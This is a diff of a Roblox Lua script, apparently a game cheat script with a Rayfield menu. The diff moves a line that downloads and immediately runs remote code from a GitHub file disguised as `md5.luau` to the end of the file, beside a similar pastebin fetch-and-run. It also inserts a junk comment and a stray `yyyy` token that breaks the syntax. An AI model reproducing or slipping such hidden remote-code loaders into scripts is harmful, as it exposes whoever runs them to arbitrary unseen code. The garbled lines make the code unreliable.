@@ -39,11 +39,10 @@ if game.GameId ~= 372226183 then
     error("'" .. script.Name .. "', Line 1")
     return
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
 local y = game.Players.LocalPlayer
 local x = game.Players.LocalPlayer.Name
 local date = os.date("*t")
-local month, day = date.month, date.day
+local month, day = date.month, date.day yyyy
 
 local function GetEventEmoji()
     -- New Year 🎆 (January 1st to 4th)
@@ -1670,6 +1669,9 @@ t5:CreateButton({
 Rayfield:LoadConfiguration()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
+--okollloo
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
+
 
 
 
